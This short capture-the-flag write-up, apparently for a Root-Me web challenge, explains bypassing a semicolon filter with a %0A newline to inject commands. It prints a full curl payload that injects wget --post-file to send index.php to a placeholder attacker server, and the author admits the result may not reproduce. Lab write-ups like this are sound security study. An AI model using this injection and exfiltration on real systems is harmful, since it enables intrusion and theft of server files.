We have already seen something like this, but a basic injection with ; does not work anymore.
We can try different separators that are used to define the separation between commands.

We see that %0A is working, we can inject new commands.

We are going to post the index.php on another website. Turning on a local server is enough.

```
curl -d 'ip=127.0.0.1 %0a wget --post-file index.php YOUR_SERVER ' -X POST "http://challenge01.root-me.org/web-serveur/ch53/index.php"
```

NOTE: This is how I did, but I now feel like this challenge is bugged, and can not reproduce this.
